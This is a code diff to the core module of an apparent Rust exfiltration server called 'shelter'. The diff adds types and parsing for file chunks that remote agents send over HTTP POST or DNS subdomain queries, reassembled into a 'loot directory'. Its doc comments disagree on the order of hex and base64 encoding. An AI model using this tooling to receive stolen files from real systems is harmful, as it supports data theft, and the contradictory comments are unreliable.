@@ -1,4 +1,4 @@
-#![doc = "Core types and helpers used by the `shelter` crate.\n\nThis module exposes the public command, error and event handler modules and\nprovides the typed representations for exfiltrated file portions and\nreconstructed files. It also contains the parsing logic that converts raw\npayload strings into structured `ExfiltratedFilePortion` instances.\n"]
+#![doc = "Core types and helpers used by the `shelter` crate.\n\nThis module exposes the public command, error and event handler modules and\nprovides the typed representations for exfiltrated file portions and\nreconstructed files. It also contains the parsing logic that converts raw\npayload strings into structured `Node` instances.\n\n# Payload Structure\n\nExfiltrated data is encoded as a colon-delimited payload with the following format:\n- **Root Node**: `r:filename:file_id` - Metadata describing the file being exfiltrated\n- **File Chunk**: `f:root_id:chunk_index:hex_encoded_data` - A portion of the file\n- **End Marker**: `e:root_id:chunk_index:hex_encoded_data` - Final chunk marking end of transmission\n\nThe complete payload is then hex-encoded and base64-encoded for transport.\n\n# Data Handling\n\n1. **Reception**: Payloads arrive via HTTP POST or DNS subdomain queries\n2. **Decoding**: Base64 decode → Hex decode → UTF-8 conversion\n3. **Parsing**: Colon-delimited fields parsed into `RootNode` or `FileChunkNode` types\n4. **Queuing**: Parsed nodes forwarded to async processing channel\n5. **Assembly**: Background handler collects chunks by root_id, reassembles file data from hex\n6. **Persistence**: Complete files written to configured loot directory\n"]
 
 /// Commands, used to expose CLI server subcommands.
 pub mod commands;
@@ -7,146 +7,226 @@ pub mod error;
 /// Event handler that consumes the processing queue and writes loot to disk.
 pub mod event_handler;
 
-use std::collections::BTreeMap;
+use std::borrow::Borrow;
 
 use base64::Engine;
+use error::app::ParserErrorStruct;
 
-/// A single received portion of an exfiltrated file.
-///
-/// The remote agent sends files in discrete portions. Each portion carries:
-/// - `file_name`: the name of the originating file.
-/// - `index`: the sequential index of this portion within the file.
-/// - `file_content`: the raw bytes payload (encoded as hex of base64 bytes).
-/// - `is_last_portion`: whether this portion marks the end of the file.
-#[derive(Clone, Debug)]
-pub struct ExfiltratedFilePortion {
+pub type ThreadSafeFileChunkNode = std::sync::Arc<FileChunkNode>;
+type RootFileIdentifier = String;
+
+#[derive(Debug, Default, Eq, Clone)]
+pub struct RootNode {
+    /// The original filename of the file being exfiltrated.
+    /// Sent as the first field in the root node payload: `r:filename:file_id`
     pub file_name: String,
+    /// A unique identifier of this file used to correlate chunks.
+    /// Sent as the second field in the root node payload.
+    pub file_identifier: RootFileIdentifier,
+}
+
+impl TryFrom<std::str::Split<'_, char>> for RootNode {
+    type Error = crate::error::app::AppError;
+
+    fn try_from(mut value: std::str::Split<'_, char>) -> Result<Self, Self::Error> {
+        let file_name = value.next();
+        let file_identifier = value.next();
+        if let (Some(file_name), Some(file_identifier)) = (file_name, file_identifier) {
+            Ok(RootNode {
+                file_name: file_name.to_string(),
+                file_identifier: file_identifier.to_string(),
+            })
+        } else {
+            Err(crate::error::app::AppError::ParserError(
+                ParserErrorStruct::new("payload_node", "Missing fields for root node".to_string()),
+            ))
+        }
+    }
+}
+
+impl std::hash::Hash for RootNode {
+    fn hash<H: std::hash::Hasher>(&self, state: &mut H) {
+        self.file_identifier.hash(state);
+    }
+}
+
+impl PartialEq for RootNode {
+    fn eq(&self, other: &Self) -> bool {
+        self.file_identifier == other.file_identifier && self.file_name == other.file_name
+    }
+}
+
+impl Borrow<RootFileIdentifier> for RootNode {
+    fn borrow(&self) -> &RootFileIdentifier {
+        &self.file_identifier
+    }
+}
+
+/// Categorizes the type of data chunk in a file transmission.
+#[derive(Debug, PartialEq, Eq, Clone)]
+pub enum ChunkType {
+    /// A regular file data chunk.
+    File,
+    /// The final chunk marking the end of file transmission.
+    End,
+}
+
+impl Default for ChunkType {
+    /// Default chunk type is File.
+    fn default() -> Self {
+        ChunkType::File
+    }
+}
+
+impl std::fmt::Display for ChunkType {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            ChunkType::File => write!(f, "f"),
+            ChunkType::End => write!(f, "e"),
+        }
+    }
+}
+
+impl PartialEq<String> for ChunkType {
+    fn eq(&self, other: &String) -> bool {
+        self.to_string() == *other
+    }
+
+    fn ne(&self, other: &String) -> bool {
+        self.to_string() != *other
+    }
+}
+
+impl From<&str> for ChunkType {
+    fn from(value: &str) -> Self {
+        match value {
+            "e" => ChunkType::End,
+            _ => ChunkType::File,
+        }
+    }
+}
+
+/// Represents a chunk of file data received.
+///
+/// FileChunkNode contains a portion of the file payload along with metadata
+/// needed to reconstruct the file (root node identifier, chunk index, and chunk type).
+/// Chunks are sent in format: `f:root_id:chunk_index:hex_encoded_data` or
+/// `e:root_id:chunk_index:hex_encoded_data` for the final chunk.
+///
+/// # Data Handling
+/// - The `root_node_id` links this chunk to a previously received RootNode
+/// - The `index` is parsed from hex and determines chunk ordering during reassembly
+/// - The `data` field contains UTF-8 byte representation of hex-encoded file data
+/// - During assembly, all chunk data is hex-decoded and concatenated by index order
+/// - The `chunk_type` of `End` signals file transmission completion
+#[derive(Debug, Default, Clone)]
+pub struct FileChunkNode {
+    /// Hexadecimal identifier linking this chunk to its root node.
+    /// Must match a previously received RootNode's file_identifier.
+    pub root_node_id: String,
+    /// The sequential index of this chunk within the file (parsed from hex format).
     pub index: usize,
-    pub file_content: Vec<u8>,
-    pub is_last_portion: bool,
+    /// The raw file data bytes in hex-encoded format.
+    /// During reassembly, these bytes are hex-decoded and concatenated.
+    pub data: Vec<u8>,
+    /// The type of chunk (File or End indicating transmission completion).
+    pub chunk_type: ChunkType,
 }
 
-/// A reconstructed exfiltrated file composed of ordered portions.
-///
-/// Portions are stored in a `BTreeMap` keyed by their `index` to ensure
-/// deterministic ordering when reconstructing the final content.
-#[derive(Clone, Debug)]
-pub struct ExfiltratedFile {
-    pub name: String,
-    pub portions: BTreeMap<usize, Vec<u8>>,
-}
-
-impl ExfiltratedFile {
-    /// Create a new, empty `ExfiltratedFile` with the given `name`.
-    pub fn new(name: String) -> Self {
-        Self {
-            name,
-            portions: BTreeMap::new(),
-        }
+impl FileChunkNode {
+    pub fn mark_as_end(mut self) -> Self {
+        self.chunk_type = ChunkType::End;
+        self
     }
 
-    /// Insert a received `ExfiltratedFilePortion` into the in-memory file map.
-    ///
-    /// If a portion with the same index already exists it will be overwritten.
-    pub fn add_portion(&mut self, file_portion: ExfiltratedFilePortion) {
-        self.portions
-            .insert(file_portion.index, file_portion.file_content);
-    }
-
-    /// Reconstruct and return the full file contents as raw bytes.
-    ///
-    /// The stored portions are expected to contain hex-encoded bytes which
-    /// are themselves base64-encoded chunks. This method:
-    /// 1. Decodes each stored chunk from hex.
-    /// 2. Decodes the resulting bytes from base64.
-    /// 3. Concatenates all decoded chunks in order.
-    ///
-    /// Any chunk that fails decoding is silently skipped (only successfully
-    /// decoded bytes are returned).
-    pub fn get_file_contents(&self) -> Vec<u8> {
-        self.portions
-            .values()
-            .filter_map(|chunk| hex::decode(chunk).ok())
-            .filter_map(|b64_chunk| base64::prelude::BASE64_STANDARD.decode(b64_chunk).ok())
-            .flatten()
-            .collect()
-    }
-}
-
-impl ExfiltratedFilePortion {
-    /// Create a new `ExfiltratedFilePortion`.
-    ///
-    /// This is a simple constructor used to build portions programmatically.
-    pub fn new(
-        file_name: String,
-        index: usize,
-        file_content: Vec<u8>,
-        is_last_portion: bool,
-    ) -> Self {
-        Self {
-            file_content,
-            index,
-            file_name,
-            is_last_portion,
+    pub fn is_last_chunk(&self) -> bool {
+        match self.chunk_type {
+            ChunkType::End => true,
+            _ => false,
         }
     }
 }
 
-/// Helper used when parsing payload bytes: returns a closure that filters out
-/// a specific separator byte while iterating.
-///
-/// The returned closure is suitable for use with iterator adapters like
-/// `map_while` to collect bytes until the separator is encountered.
-fn is_not_payload_separator(separator: u8) -> impl Fn(u8) -> Option<u8> {
-    move |byte| byte.ne(&separator).then_some(byte)
+impl TryFrom<std::str::Split<'_, char>> for FileChunkNode {
+    type Error = crate::error::app::AppError;
+
+    fn try_from(mut value: std::str::Split<'_, char>) -> Result<Self, Self::Error> {
+        let root_node_id = value.next();
+        let index = value.next();
+        let data = value.next();
+        if let (Some(root_node_id), Some(index), Some(data)) = (root_node_id, index, data) {
+            Ok(FileChunkNode {
+                root_node_id: root_node_id.to_string(),
+                index: usize::from_str_radix(index, 16)?,
+                data: data.bytes().collect::<Vec<u8>>(),
+                chunk_type: ChunkType::File,
+            })
+        } else {
+            Err(crate::error::app::AppError::ParserError(
+                ParserErrorStruct::new(
+                    "payload_node",
+                    "Missing fields for file chunk node".to_string(),
+                ),
+            ))
+        }
+    }
 }
 
-/// Parse a raw payload `String` into an `ExfiltratedFilePortion`.
+/// Represents a node in the file exfiltration tree.
 ///
-/// The expected payload format (before transport encoding) is:
-/// "<file_name>:<index>:<file_chunk>:<last_marker?>"
-///
-/// The function first decodes an outer hex encoding, then base64-decodes the
-/// resulting bytes, and finally splits by ':' to extract fields. Errors from
-/// decoding/parsing are converted into `crate::error::app::AppError`.
-impl TryFrom<String> for ExfiltratedFilePortion {
+/// A Node can be either a root metadata node or a file chunk data node.
+/// Nodes are the primary unit exchanged between transport handlers and the background
+/// processing queue. Each Node is decoded from a double-encoded payload:
+/// Base64(Hex(Colon-delimited-fields))
+#[derive(Debug)]
+pub enum Node {
+    /// The root metadata node containing file information (node_type='r').
+    /// Payload format: `r:filename:file_id`
+    Root(RootNode),
+    /// A file chunk data node containing portion of the file (node_type='f' or 'e').
+    /// Payload format: `f:root_id:chunk_index:hex_encoded_data`
+    /// The 'e' variant marks the final chunk and triggers file assembly.
+    FileChunk(FileChunkNode),
+}
+
+impl Node {
+    pub fn node_type(&self) -> &str {
+        match self {
+            Node::Root(_) => "Root",
+            Node::FileChunk(_) => "FileChunk",
+        }
+    }
+}
+
+impl TryFrom<String> for Node {
     type Error = crate::error::app::AppError;
 
     fn try_from(value: String) -> Result<Self, Self::Error> {
-        let mut payload_iter = base64::prelude::BASE64_STANDARD
-            .decode(hex::decode(value)?)?
-            .into_iter();
+        // Decode payload: Hex(UTF-8(Base64(Colon-delimited-fields)))
+        // Step 1: Hex decode the input string
+        let hex_decoded = hex::decode(value)?;
+        // Step 2: Base64 decode the hex result
+        let base64_decoded = base64::prelude::BASE64_STANDARD.decode(hex_decoded)?;
+        // Step 3: Convert bytes to UTF-8 string
+        let decoded_payload = String::from_utf8(base64_decoded)?;
+        // Step 4: Split on colon delimiters
+        let mut decoded_payload = decoded_payload.split(':').into_iter();
 
-        let file_name = String::from_utf8(
-            payload_iter
-                .by_ref()
-                .map_while(is_not_payload_separator(':' as u8))
-                .collect::<Vec<u8>>(),
-        )?;
-
-        let index = String::from_utf8(
-            payload_iter
-                .by_ref()
-                .map_while(is_not_payload_separator(':' as u8))
-                .collect::<Vec<u8>>(),
-        )?
-        .parse::<usize>()?;
-
-        let file_content = payload_iter
-            .by_ref()
-            .map_while(is_not_payload_separator(':' as u8))
-            .collect::<Vec<u8>>();
-
-        let last_payload = payload_iter
-            .by_ref()
-            .map_while(is_not_payload_separator(':' as u8))
-            .collect::<Vec<u8>>();
-
-        Ok(Self::new(
-            file_name,
-            index,
-            file_content,
-            !last_payload.is_empty(),
-        ))
+        if let Some(node_type) = decoded_payload.next() {
+            match node_type {
+                "r" => Ok(Self::Root(RootNode::try_from(decoded_payload)?)),
+                "f" => Ok(Self::FileChunk(FileChunkNode::try_from(decoded_payload)?)),
+                "e" => Ok(Self::FileChunk(
+                    FileChunkNode::try_from(decoded_payload)?.mark_as_end(),
+                )),
+                _ => Err(crate::error::app::AppError::ParserError(
+                    ParserErrorStruct::new("payload_node", "Unknown node type".to_string()),
+                )),
+            }
+        } else {
+            Err(crate::error::app::AppError::ParserError(
+                ParserErrorStruct::new("payload_node", "Empty payload".to_string()),
+            ))
+        }
     }
 }
